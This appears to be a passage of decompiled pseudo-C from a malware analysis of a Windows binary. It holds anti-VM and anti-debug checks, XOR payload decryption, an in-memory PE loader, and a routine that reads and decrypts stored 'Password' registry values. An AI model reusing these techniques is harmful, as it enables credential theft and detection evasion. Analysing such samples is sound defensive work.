    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_WRITE=2147483648,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_TYPE_NO_PAD=8
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IUnknown IUnknown, *PIUnknown;

struct IUnknownVtbl {
    HRESULT (* QueryInterface)(struct IUnknown *, IID *, void * *);
    ULONG (* AddRef)(struct IUnknown *);
    ULONG (* Release)(struct IUnknown *);
};

struct IUnknown {
    struct IUnknownVtbl * lpVtbl;
};

typedef struct IUnknown * LPUNKNOWN;




// WARNING: Removing unreachable block (ram,0x003810e1)

byte FUN_00381090(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 *local_8;
  
  local_18 = 0xffffffff;
  local_14 = 0;
  local_10 = 0;
  local_c = 0;
  Sleep(1);
  Sleep(1);
  Sleep(1);
  Sleep(1);
  local_8 = &local_18;
  Sleep(1);
  Sleep(1);
  Sleep(1);
  Sleep(1);
  puVar2 = local_8;
  puVar1 = (undefined4 *)cpuid_Version_info(1);
  uVar5 = puVar1[1];
  uVar4 = puVar1[2];
  uVar3 = puVar1[3];
  *local_8 = *puVar1;
  puVar2[1] = uVar5;
  puVar2[2] = uVar3;
  puVar2[3] = uVar4;
  Sleep(1);
  Sleep(1);
  Sleep(1);
  Sleep(1);
  return (byte)((int)local_10 >> 0x1f) & 1;
}



void FUN_00381120(void)

{
  uint uVar1;
  BOOL BVar2;
  undefined4 extraout_EDX;
  undefined uVar3;
  uint local_48;
  uint local_44;
  
  uVar1 = DAT_003d6664 ^ (uint)&stack0xffffffb0;
  trim_string((undefined (*) [16])&stack0xffffffb0,0,0x40);
  uVar3 = 0x40;
  BVar2 = GlobalMemoryStatusEx((LPMEMORYSTATUSEX)&stack0xffffffb0);
  if ((BVar2 == 1) && ((local_44 >> 0x14 != 0 || (0x308 < (local_48 >> 0x14 | local_44 << 0xc))))) {
    terminate_if_debugger_present(uVar1 ^ (uint)&stack0xffffffb0,extraout_EDX,uVar3);
    return;
  }
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}


/*
Unable to decompile 'FUN_00381380'
Cause: Exception while decompiling 00381380: process: timeout

*/


void __thiscall FUN_003846b0(void *this,int param_1,char *param_2)

{
  wchar_t *i;
  HLOCAL incremented_object;
  size_t param_2_length;
  int iterations;
  undefined4 extraout_EDX;
  void *zero;
  undefined uVar1;
  wchar_t lorem_ipsum [260];
  uint local_8;
  void *object;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  iterations = 520;
  i = lorem_ipsum;
  do {
    *(undefined *)i = 0;
    i = (wchar_t *)((int)i + 1);
    iterations = iterations + -1;
  } while (iterations != 0);
  object = this;
  concatenate_strings(lorem_ipsum,
                      L"Nor again is there anyone who loves or pursues or desires to obtain pain of itself, because it is pain"
                     );
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  incremented_object = LocalAlloc(0x40,(int)this + 1);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  *(undefined *)((int)this + (int)incremented_object) = 0;
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  zero = (void *)0x0;
  if (this != (void *)0x0) {
    do {
      str_len(lorem_ipsum);
      str_len(lorem_ipsum);
      param_2_length = _strlen(param_2);
      *(byte *)((int)zero + (int)incremented_object) =
           param_2[(uint)zero % param_2_length] ^
           ((byte *)((int)zero + (int)incremented_object))[param_1 - (int)incremented_object];
      str_len(lorem_ipsum);
      str_len(lorem_ipsum);
      zero = (void *)((int)zero + 1);
    } while (zero < object);
  }
  uVar1 = SUB41(object,0);
  str_len(lorem_ipsum);
  str_len(lorem_ipsum);
  trim_string((undefined (*) [16])lorem_ipsum,0,520);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar1);
  return;
}



undefined FUN_00384860(void)

{
  size_t _Size;
  undefined4 *puVar1;
  int iVar2;
  int *unaff_EBX;
  undefined4 *unaff_ESI;
  
  if (0x3f < (uint)unaff_EBX[1]) {
    FUN_003aee70(unaff_ESI,(undefined4 *)*unaff_EBX,0x40);
    if ((*(short *)unaff_ESI != 0x5a4d) || (iVar2 = unaff_ESI[0xf], iVar2 == 0)) {
      return 2;
    }
    if (iVar2 + 0xf8U < (uint)unaff_EBX[1] || iVar2 + 0xf8U == unaff_EBX[1]) {
      FUN_003aee70(unaff_ESI + 0x10,(undefined4 *)(*unaff_EBX + iVar2),0xf8);
      if (((unaff_ESI[0x10] == 0x4550) && (*(short *)(unaff_ESI + 0x16) == 0x10b)) &&
         (*(ushort *)((int)unaff_ESI + 0x46) != 0)) {
        _Size = (uint)*(ushort *)((int)unaff_ESI + 0x46) * 0x28;
        unaff_ESI[0x50] = _Size;
        puVar1 = (undefined4 *)_malloc(_Size);
        unaff_ESI[0x4e] = puVar1;
        if (puVar1 == (undefined4 *)0x0) {
          return 3;
        }
        iVar2 = *(ushort *)(unaff_ESI + 0x15) + 0x18 + unaff_ESI[0xf];
        unaff_ESI[0x4f] = iVar2;
        iVar2 = FUN_00384f20(puVar1,iVar2,_Size,unaff_EBX);
        return iVar2 == 0;
      }
      return 2;
    }
  }
  return true;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00384930(void)

{
  uint uVar1;
  int iVar2;
  uint *puVar3;
  uint uVar4;
  int unaff_ESI;
  uint uVar5;
  uint local_8;
  
  uVar4 = 0;
  uVar5 = 0;
  if (*(short *)(unaff_ESI + 0x46) != 0) {
    local_8 = (uint)*(ushort *)(unaff_ESI + 0x46);
    puVar3 = (uint *)(*(int *)(unaff_ESI + 0x138) + 0xc);
    do {
      if (puVar3[-1] != 0) {
        uVar1 = *puVar3;
        if (uVar1 < uVar4) {
          uVar4 = uVar1;
        }
        uVar1 = uVar1 + puVar3[-1];
        if (uVar5 < uVar1) {
          uVar5 = uVar1;
        }
      }
      puVar3 = puVar3 + 10;
      local_8 = local_8 - 1;
    } while (local_8 != 0);
  }
  iVar2 = (*_DAT_003d94cc)(*(int *)(unaff_ESI + 0x74) + uVar4,uVar5 - uVar4,0x3000,0x40);
  *(int *)(unaff_ESI + 0x148) = iVar2;
  *(undefined4 *)(unaff_ESI + 0x144) = *(undefined4 *)(unaff_ESI + 0x74);
  if (iVar2 == 0) {
    if ((*(byte *)(unaff_ESI + 0x56) & 1) != 0) {
      return 4;
    }
    iVar2 = (*_DAT_003d94cc)(0,uVar5 - uVar4,0x3000,0x40);
    *(int *)(unaff_ESI + 0x148) = iVar2;
    *(uint *)(unaff_ESI + 0x144) = iVar2 - uVar4;
  }
  return (-(uint)(*(int *)(unaff_ESI + 0x148) != 0) & 0xfffffffd) + 3;
}



undefined4 FUN_003849e0(void)

{
  uint uVar1;
  uint uVar2;
  int *unaff_EBX;
  uint *puVar3;
  int unaff_EDI;
  uint local_8;
  
  uVar2 = *(int *)(unaff_EDI + 0x140) + *(int *)(unaff_EDI + 0x13c);
  if (uVar2 != 0) {
    if ((uint)unaff_EBX[1] <= uVar2 && uVar2 != unaff_EBX[1]) {
      return 1;
    }
    FUN_003aee70(*(undefined4 **)(unaff_EDI + 0x144),(undefined4 *)*unaff_EBX,uVar2);
  }
  local_8 = 0;
  if (*(short *)(unaff_EDI + 0x46) != 0) {
    puVar3 = (uint *)(*(int *)(unaff_EDI + 0x138) + 0x10);
    do {
      uVar2 = puVar3[-2];
      if (*puVar3 <= puVar3[-2]) {
        uVar2 = *puVar3;
      }
      if (uVar2 != 0) {
        uVar1 = puVar3[1] + uVar2;
        if ((uint)unaff_EBX[1] <= uVar1 && uVar1 != unaff_EBX[1]) {
          return 1;
        }
        FUN_003aee70((undefined4 *)(puVar3[-1] + *(int *)(unaff_EDI + 0x144)),
                     (undefined4 *)(*unaff_EBX + puVar3[1]),uVar2);
      }
      local_8 = local_8 + 1;
      puVar3 = puVar3 + 10;
    } while (local_8 < *(ushort *)(unaff_EDI + 0x46));
  }
  return 0;
}



undefined4 __cdecl FUN_00384a90(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  ushort uVar4;
  int *piVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  int *piVar9;
  
  iVar2 = *(int *)(param_1 + 0x74);
  if (*(int *)(param_1 + 0x144) == iVar2) {
    return 0;
  }
  if ((*(int *)(param_1 + 0xe0) != 0) && (*(int *)(param_1 + 0xe4) != 0)) {
    iVar3 = *(int *)(param_1 + 0x144);
    piVar6 = (int *)(iVar3 + *(int *)(param_1 + 0xe0));
    piVar1 = (int *)(*(int *)(param_1 + 0xe4) + -8 + (int)piVar6);
    do {
      if (piVar1 <= piVar6) {
        return 0;
      }
      uVar8 = piVar6[1] - 8U >> 1;
      piVar9 = piVar6 + 2;
      uVar7 = 0;
      if (uVar8 != 0) {
        do {
          uVar4 = *(ushort *)piVar9 >> 0xc;
          if (uVar4 != 0) {
            if (uVar4 != 3) {
              return 5;
            }
            piVar5 = (int *)((*(ushort *)piVar9 & 0xfff) + *piVar6 + *(int *)(param_1 + 0x144));
            *piVar5 = *piVar5 + (iVar3 - iVar2);
          }
          uVar7 = uVar7 + 1;
          piVar9 = (int *)((int)piVar9 + 2);
        } while (uVar7 < uVar8);
      }
      piVar6 = (int *)((int)piVar6 + piVar6[1]);
    } while( true );
  }
  return 4;
}



int FUN_00384b50(void)

{
  FARPROC *ppFVar1;
  uint uVar2;
  HMODULE hModule;
  int iVar3;
  FARPROC pFVar4;
  int *piVar5;
  FARPROC *ppFVar6;
  FARPROC *ppFVar7;
  int unaff_EDI;
  undefined4 *local_10;
  
  if ((*(int *)(unaff_EDI + 0xc0) == 0) || (*(int *)(unaff_EDI + 0xc4) == 0)) {
    return 0;
  }
  piVar5 = (int *)(*(int *)(unaff_EDI + 0x144) + *(int *)(unaff_EDI + 0xc0));
  iVar3 = piVar5[3];
  if (iVar3 == 0) {
    return iVar3;
  }
  do {
    hModule = LoadLibraryA((LPCSTR)(*(int *)(unaff_EDI + 0x144) + iVar3));
    if (hModule == (HMODULE)0x0) {
      return 6;
    }
    uVar2 = *(uint *)(unaff_EDI + 0x154);
    if (uVar2 <= *(uint *)(unaff_EDI + 0x150)) {
      if (uVar2 == 0) {
        iVar3 = 0x10;
      }
      else {
        iVar3 = uVar2 * 2;
      }
      *(int *)(unaff_EDI + 0x154) = iVar3;
      local_10 = (undefined4 *)_malloc(iVar3 * 4);
      if (local_10 == (undefined4 *)0x0) {
        return 3;
      }
      if (*(int *)(unaff_EDI + 0x150) != 0) {
        FUN_003aee70(local_10,*(undefined4 **)(unaff_EDI + 0x14c),*(int *)(unaff_EDI + 0x150) * 4);
      }
      _free(*(void **)(unaff_EDI + 0x14c));
      *(undefined4 **)(unaff_EDI + 0x14c) = local_10;
    }
    local_10[*(int *)(unaff_EDI + 0x150)] = hModule;
    *(int *)(unaff_EDI + 0x150) = *(int *)(unaff_EDI + 0x150) + 1;
    ppFVar7 = (FARPROC *)(piVar5[4] + *(int *)(unaff_EDI + 0x144));
    ppFVar6 = ppFVar7;
    if (piVar5[1] != 0) {
      if (*piVar5 == 0) {
        return 8;
      }
      ppFVar6 = (FARPROC *)(*piVar5 + *(int *)(unaff_EDI + 0x144));
    }
    pFVar4 = *ppFVar6;
    while (pFVar4 != (FARPROC)0x0) {
      if ((int)pFVar4 < 0) {
        pFVar4 = (FARPROC)((uint)pFVar4 & 0xffff);
      }
      else {
        pFVar4 = pFVar4 + *(int *)(unaff_EDI + 0x144) + 2;
      }
      pFVar4 = GetProcAddress(hModule,(LPCSTR)pFVar4);
      *ppFVar7 = pFVar4;
      if (pFVar4 == (FARPROC)0x0) {
        return 6;
      }
      ppFVar1 = ppFVar6 + 1;
      ppFVar6 = ppFVar6 + 1;
      ppFVar7 = ppFVar7 + 1;
      pFVar4 = *ppFVar1;
    }
    iVar3 = piVar5[8];
    piVar5 = piVar5 + 5;
    if (iVar3 == 0) {
      return iVar3;
    }
  } while( true );
}



undefined4 FUN_00384ce0(void)

{
  BOOL BVar1;
  uint uVar2;
  uint *puVar3;
  int unaff_EDI;
  DWORD local_8;
  
  uVar2 = 0;
  if (*(short *)(unaff_EDI + 0x46) != 0) {
    puVar3 = (uint *)(*(int *)(unaff_EDI + 0x138) + 0x24);
    do {
      if ((*puVar3 & 0x20) != 0) {
        *puVar3 = *puVar3 | 0x60000000;
      }
      switch(*puVar3 >> 0x1d) {
      case 0:
      case 2:
        local_8 = 2;
        break;
      case 1:
        local_8 = 0x10;
        break;
      case 3:
        local_8 = 0x20;
        break;
      case 4:
      case 6:
        local_8 = 4;
        break;
      default:
        local_8 = 0x40;
      }
      BVar1 = VirtualProtect((LPVOID)(puVar3[-6] + *(int *)(unaff_EDI + 0x144)),puVar3[-7],local_8,
                             &local_8);
      if (BVar1 == 0) {
        return 9;
      }
      uVar2 = uVar2 + 1;
      puVar3 = puVar3 + 10;
    } while (uVar2 < *(ushort *)(unaff_EDI + 0x46));
  }
  return 0;
}



// WARNING: Removing unreachable block (ram,0x00384dc8)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00384da0(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int iVar1;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint extraout_EDX_04;
  uint extraout_EDX_05;
  uint uVar2;
  undefined8 uVar3;
  undefined local_164 [104];
  int local_fc;
  undefined4 local_ac;
  void *local_2c;
  int local_20;
  undefined4 local_1c;
  void *local_18;
  uint local_14;
  undefined4 local_10;
  code *local_c;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_2c = (void *)0x0;
  local_18 = (void *)0x0;
  local_10 = 0;
  local_14 = 0;
  local_c = (code *)0x0;
  uVar3 = FUN_00384860();
  uVar2 = (uint)((ulonglong)uVar3 >> 0x20);
  if (((((int)uVar3 == 0) && (iVar1 = FUN_00384930(), uVar2 = extraout_EDX, iVar1 == 0)) &&
      (iVar1 = FUN_003849e0(), uVar2 = extraout_EDX_00, iVar1 == 0)) &&
     (((iVar1 = FUN_00384a90((int)local_164), uVar2 = extraout_EDX_01, iVar1 == 0 &&
       (iVar1 = FUN_00384b50(), uVar2 = extraout_EDX_02, iVar1 == 0)) &&
      (iVar1 = FUN_00384ce0(), uVar2 = extraout_EDX_03, iVar1 == 0)))) {
    if (local_fc != 0) {
      local_c = (code *)(local_fc + local_20);
      uVar3 = (*local_c)(local_20,1,0);
      uVar2 = (uint)((ulonglong)uVar3 >> 0x20);
      if ((int)uVar3 == 0) {
        terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,(char)param_3);
        return;
      }
    }
    if (param_3 == (undefined4 *)0x0) {
      if (local_18 != (void *)0x0) {
        uVar2 = 0;
        if (local_14 != 0) {
          do {
            (*_DAT_003d95dc)(*(undefined4 *)((int)local_18 + uVar2 * 4));
            uVar2 = uVar2 + 1;
          } while (uVar2 < local_14);
        }
        _free(local_18);
        uVar2 = extraout_EDX_04;
      }
    }
    else {
      param_3[2] = local_20;
      param_3[3] = local_1c;
      param_3[4] = local_c;
      param_3[5] = local_ac;
      *param_3 = 0x20;
      param_3[1] = 0;
      param_3[6] = local_18;
      param_3[7] = local_14;
      uVar2 = local_14;
    }
    if (local_2c != (void *)0x0) {
      _free(local_2c);
      uVar2 = extraout_EDX_05;
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,(char)param_3);
  return;
}



undefined4 __cdecl FUN_00384f20(undefined4 *param_1,int param_2,uint param_3,int *param_4)

{
  if (param_3 != 0) {
    if ((uint)param_4[1] <= param_2 + param_3 && param_2 + param_3 != param_4[1]) {
      return 0;
    }
    FUN_003aee70(param_1,(undefined4 *)(*param_4 + param_2),param_3);
  }
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_00384f60(int param_1)

{
  uint in_EAX;
  int iVar1;
  int unaff_ESI;
  uint uVar2;
  
  if (param_1 != 0) {
    if (in_EAX < 0x10000) {
      uVar2 = *(uint *)(param_1 + 0x10 + unaff_ESI);
      if (in_EAX < uVar2) {
        return 0;
      }
      in_EAX = in_EAX - uVar2;
    }
    else {
      uVar2 = 0;
      if (*(int *)(param_1 + 0x18 + unaff_ESI) != 0) {
        do {
          iVar1 = (*_DAT_003d9550)(*(int *)(*(int *)(param_1 + 0x20 + unaff_ESI) + uVar2 * 4 +
                                           unaff_ESI) + unaff_ESI);
          if (iVar1 == 0) {
            in_EAX = (uint)*(ushort *)(*(int *)(param_1 + 0x24 + unaff_ESI) + uVar2 * 2 + unaff_ESI)
            ;
            break;
          }
          uVar2 = uVar2 + 1;
        } while (uVar2 < *(uint *)(param_1 + 0x18 + unaff_ESI));
      }
    }
    if (in_EAX < *(uint *)(param_1 + 0x14 + unaff_ESI)) {
      return *(int *)(*(int *)(param_1 + 0x1c + unaff_ESI) + in_EAX * 4 + unaff_ESI) + unaff_ESI;
    }
  }
  return 0;
}



undefined ** __thiscall FUN_00385000(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  FUN_003b0a88((undefined **)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



void FUN_00385030(void)

{
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined1 * __cdecl FUN_00385040(int param_1,int param_2)

{
  undefined4 uVar1;
  undefined1 *puVar2;
  int iVar3;
  int local_14;
  int local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  uVar1 = (*_DAT_003d957c)(8,0x400);
  puVar2 = (undefined1 *)(*_DAT_003d9504)(uVar1);
  local_10 = param_1 + 1;
  local_14 = param_2 + -1;
  iVar3 = (*_DAT_003d9428)(&local_14,0,0,0,0,1,&local_c);
  if (iVar3 != 0) {
    (*_DAT_003d94b8)(0,0,local_8,local_c,puVar2,0x400,0,0);
    (*_DAT_003d95c8)(local_8);
    return puVar2;
  }
  return &DAT_003ce656;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_003850c0(void *this,undefined4 param_1)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  char *_Src;
  undefined4 uVar5;
  undefined4 extraout_ECX;
  int **unaff_EBX;
  int **in_FS_OFFSET;
  undefined8 uVar6;
  undefined uVar7;
  undefined4 uVar8;
  undefined4 local_c74;
  int local_c70;
  int local_c6c;
  undefined4 local_c68;
  int local_c64;
  int local_c60;
  int *local_c5c [4];
  undefined4 local_c4c;
  uint local_c48;
  int *local_c40 [4];
  undefined4 local_c30;
  uint local_c2c;
  int local_c24;
  int *local_c20;
  int *local_c18 [256];
  int *local_818 [256];
  int *local_418 [256];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c39c7;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_c68 = 0x80000001;
  *unaff_EBX = (int *)0x0;
  unaff_EBX[1] = (int *)0x0;
  unaff_EBX[2] = (int *)0x0;
  uVar8 = 0x20019;
  local_8 = 0;
  *(undefined4 *)this = 0;
  uVar6 = (*_DAT_003d9448)(0x80000001,param_1,0,0x20019,&local_c68,local_18);
  uVar5 = (undefined4)((ulonglong)uVar6 >> 0x20);
  uVar7 = (undefined)uVar8;
  if ((int)uVar6 == 0) {
    local_818[0]._0_1_ = '\0';
    local_c6c = 0;
    local_c74 = 0xff;
    local_c70 = 3;
    uVar6 = (*_DAT_003d95c0)(local_c68,0,local_818,&local_c74,0,&local_c70,local_418,&local_c64);
    uVar7 = (undefined)uVar8;
    while (uVar5 = (undefined4)((ulonglong)uVar6 >> 0x20), (int)uVar6 == 0) {
      local_c48 = 0xf;
      local_c4c = 0;
      local_c5c[0] = (int *)((uint)local_c5c[0] & 0xffffff00);
      local_c2c = 0xf;
      local_c30 = 0;
      local_c40[0] = (int *)((uint)local_c40[0] & 0xffffff00);
      local_8 = 1;
      piVar3 = (int *)_strlen((char *)local_818);
      FUN_003894c0(local_c5c,local_818,piVar3);
      local_c60 = local_c70;
      local_c24 = local_c64;
      if (local_c70 == 3) {
        iVar4 = (*_DAT_003d93a0)(local_818,"Password");
        if (iVar4 == 0) {
          FUN_00389b10(extraout_ECX,(char *)local_418,"%S");
          piVar3 = (int *)_strlen((char *)local_418);
          FUN_003894c0(local_c40,local_418,piVar3);
        }
        else {
          _Src = FUN_00385040((int)local_418,local_c64);
          _strcpy_s((char *)local_c18,0x400,_Src);
          uVar5 = (*_DAT_003d957c)(0,_Src);
          (*_DAT_003d95a8)(uVar5);
          piVar3 = (int *)_strlen((char *)local_c18);
          FUN_003894c0(local_c40,local_c18,piVar3);
          _strcpy_s((char *)local_c18,0x400,"");
        }
      }
      else {
        if (local_c70 == 1) {
          piVar3 = (int *)_strlen((char *)local_418);
          FUN_003894c0(local_c40,local_418,piVar3);
        }
        else {
          if (local_c70 == 4) {
            local_c20 = local_418[0];
          }
        }
      }
                    // WARNING: Load size is inaccurate
      *(int *)this = *this + 1;
      piVar3 = unaff_EBX[1];
      if (&local_c60 < piVar3) {
        piVar1 = *unaff_EBX;
        if (&local_c60 < piVar1) goto LAB_003854d0;
        if (piVar3 == unaff_EBX[2]) {
          FUN_00389450((int *)unaff_EBX);
        }
        piVar2 = unaff_EBX[1];
        piVar3 = *unaff_EBX + (((int)&local_c60 - (int)piVar1) / 0x44) * 0x11;
        local_8._0_1_ = 2;
        if (piVar2 != (int *)0x0) {
          *piVar2 = *piVar3;
          piVar2[6] = 0xf;
          piVar2[5] = 0;
          *(undefined *)(piVar2 + 1) = 0;
          FUN_003896c0(piVar2 + 1,(int **)(piVar3 + 1),(int *)0x0,(int *)0xffffffff);
          local_8._0_1_ = 3;
          piVar2[0xd] = 0xf;
          piVar2[0xc] = 0;
          *(undefined *)(piVar2 + 8) = 0;
          FUN_003896c0(piVar2 + 8,(int **)(piVar3 + 8),(int *)0x0,(int *)0xffffffff);
          piVar2[0xf] = piVar3[0xf];
          piVar2[0x10] = piVar3[0x10];
        }
      }
      else {
LAB_003854d0:
        if (piVar3 == unaff_EBX[2]) {
          FUN_00389450((int *)unaff_EBX);
        }
        piVar3 = unaff_EBX[1];
        local_8._0_1_ = 4;
        if (piVar3 != (int *)0x0) {
          *piVar3 = local_c60;
          piVar3[6] = 0xf;
          piVar3[5] = 0;
          *(undefined *)(piVar3 + 1) = 0;
          FUN_003896c0(piVar3 + 1,local_c5c,(int *)0x0,(int *)0xffffffff);
          local_8._0_1_ = 5;
          piVar3[0xd] = 0xf;
          piVar3[0xc] = 0;
          *(undefined *)(piVar3 + 8) = 0;
          FUN_003896c0(piVar3 + 8,local_c40,(int *)0x0,(int *)0xffffffff);
          piVar3[0xf] = local_c24;
          piVar3[0x10] = (int)local_c20;
        }
      }
      unaff_EBX[1] = unaff_EBX[1] + 0x11;
      local_c6c = local_c6c + 1;
      local_8 = (uint)local_8._1_3_ << 8;
      local_c74 = 0x400;
      local_c64 = 0x400;
      if (0xf < local_c2c) {
        FUN_003aee4b(local_c40[0]);
      }
      local_c2c = 0xf;
      local_c30 = 0;
      local_c40[0] = (int *)((uint)local_c40[0] & 0xffffff00);
      if (0xf < local_c48) {
        FUN_003aee4b(local_c5c[0]);
      }
      local_c48 = 0xf;
      local_c4c = 0;
      local_c5c[0] = (int *)((uint)local_c5c[0] & 0xffffff00);
      uVar6 = (*_DAT_003d95c0)(local_c68,local_c6c,local_818,&local_c74,0,&local_c70,local_418,
                               &local_c64);
      uVar7 = (undefined)uVar8;
    }
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar5,uVar7);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00385560(undefined4 param_1)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  undefined4 *puVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar5;
  undefined4 extraout_EDX_02;
  int iVar6;
  int **in_FS_OFFSET;
  void *in_stack_ffffffb8;
  int local_38;
  void *local_34;
  undefined4 local_24;
  uint local_20;
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c41c0;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_18 = uVar2;
  FUN_003850c0(&local_38,param_1);
  iVar1 = local_38;
  iVar6 = 0;
  local_8 = 0;
  uVar5 = extraout_EDX;
  if ((0 < local_38) &&
     ((*_DAT_003d9520)(DAT_003d92d4,&DAT_003ce668,uVar2), uVar5 = extraout_EDX_00, 0 < iVar1)) {
    do {
      local_38 = iVar1;
      piVar3 = (int *)(iVar6 + 4 + (int)in_stack_ffffffb8);
      if (0xf < *(uint *)(iVar6 + 0x18 + (int)in_stack_ffffffb8)) {
        piVar3 = (int *)*piVar3;
      }
      (*_DAT_003d9520)(DAT_003d92d4,piVar3);
      (*_DAT_003d9520)(DAT_003d92d4,&DAT_003ce66c);
      if (*(int *)(iVar6 + (int)in_stack_ffffffb8) == 4) {
        puVar4 = (undefined4 *)FUN_003a5670(*(undefined4 *)(iVar6 + 0x40 + (int)in_stack_ffffffb8));
        local_8._0_1_ = 1;
        if (0xf < (uint)puVar4[5]) {
          puVar4 = (undefined4 *)*puVar4;
        }
        (*_DAT_003d9520)(DAT_003d92d4,puVar4);
        local_8 = (uint)local_8._1_3_ << 8;
        if (0xf < local_20) {
          FUN_003aee4b(local_34);
        }
        local_20 = 0xf;
        local_24 = 0;
        local_34 = (void *)((uint)local_34 & 0xffffff00);
      }
      else {
        piVar3 = (int *)(iVar6 + 0x20 + (int)in_stack_ffffffb8);
        if (0xf < *(uint *)(iVar6 + 0x34 + (int)in_stack_ffffffb8)) {
          piVar3 = (int *)*piVar3;
        }
        (*_DAT_003d9520)(DAT_003d92d4,piVar3);
      }
      (*_DAT_003d9520)(DAT_003d92d4,&DAT_003ce668);
      iVar6 = iVar6 + 0x44;
      local_38 = local_38 + -1;
      uVar5 = extraout_EDX_01;
      iVar1 = local_38;
    } while (local_38 != 0);
  }
  if (in_stack_ffffffb8 != (void *)0x0) {
    FUN_00389fb0();
    FUN_003aee4b(in_stack_ffffffb8);
    uVar5 = extraout_EDX_02;
  }
  *in_FS_OFFSET = local_10;
